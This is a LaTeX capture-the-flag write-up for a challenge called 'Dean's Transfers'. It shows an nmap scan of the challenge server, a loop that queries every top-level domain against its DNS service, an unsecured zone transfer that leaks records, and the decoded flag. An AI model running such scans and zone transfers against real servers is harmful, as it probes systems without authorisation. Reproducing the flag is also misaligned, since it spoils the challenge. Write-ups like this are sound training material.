% !TeX root = ../solution.tex

\hypertarget{he22.23}{%
\chapter{[HE22.23] Dean's Transfers}\label{he22.23}}

\begin{marginfigure}
	\includegraphics[width=49mm]{level6/challenge23.jpg}
\end{marginfigure}
\section{Intro}
Dean just launched his taxi business named Dean's Transfers.

\noindent
For his website, he first wanted to register \texttt{deans-transfers.com}, 
but then found out there are so many fancy top-level domains out there. 
You found a service running on his server - find a flag there!

\noindent
The service is running on port 2211 on 46.101.107.117.

\noindent
Note: The service is restarted every hour at x:00.

\subsection{Hint}
Service fingerprinting.

\section{Solution}\label{hv22.23solution}

Service fingerprinting with \verb+nmap+ doesn't show any open ports, but
testing explicitly for port 2211 shows a result:

\begin{fullwidth}
{\footnotesize
\begin{verbatim}
$ nmap -sV 46.101.107.117 -p 2211
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 11:55 CEST
Nmap scan report for 46.101.107.117
Host is up (0.021s latency).

PORT     STATE SERVICE VERSION
2211/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u6 (Debian Linux)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.59 seconds
\end{verbatim}
}
\end{fullwidth}

So we have to find a way for it to spill some information.  The hint indicates
that Dean was baffled by the many top level domains, probably he found one that
fits him.  Get the list of all top-level domains at
\url{https://data.iana.org/TLD/tlds-alpha-by-domain.txt} and try to see if we
can get a proper response from the DNS-server:

\begin{verbatim}
$ for tld in $(cat tlds-alpha-by-domain.txt)
> do
> dig @46.101.107.117 -p 2211 $tld
> done | tee run2.out
\end{verbatim}

For the domain \verb+express+ the reply is much longer, so we know that Dean
used the domain \verb+deans-transports.express+.  Probably we are looking for
an unsecured DNS zone transfer so try this:
\begin{fullwidth}
	{\footnotesize
\begin{verbatim}
$ dig -t axfr deans-transfers.express. @46.101.107.117 -p 2211

; <<>> DiG 9.18.0-2-Debian <<>> -t axfr deans-transfers.express. @46.101.107.117 -p 2211
;; global options: +cmd
deans-transfers.express. 302400 IN      SOA     deans-transfers.express. admin.deans-transfers.express.deans-transfers.express. 2 302400 43200 302400 302400
deans-transfers.express. 302400 IN      NS      ns.deans-transfers.express.
aGUyMDIye2QzNG5fZHIxdjNzX3lvdV8zdjNyeXdoM3IzISF9.deans-transfers.express. 302400 IN A 10.0.0.8
base64decode.deans-transfers.express. 302400 IN A 10.0.13.9
ns.deans-transfers.express. 302400 IN   A       10.0.0.2
deans-transfers.express. 302400 IN      SOA     deans-transfers.express. admin.deans-transfers.express.deans-transfers.express. 2 302400 43200 302400 302400
;; Query time: 20 msec
;; SERVER: 46.101.107.117#2211(46.101.107.117) (TCP)
;; WHEN: Sun Apr 10 20:05:34 CEST 2022
;; XFR size: 6 records (messages 1, bytes 309)
\end{verbatim}
}
\end{fullwidth}

The host with IP 10.0.0.8 looks suspicious, if its basename is base64-decoded we get the flag
\verb+he2022{d34n_dr1v3s_you_3v3rywh3r3!!}+.




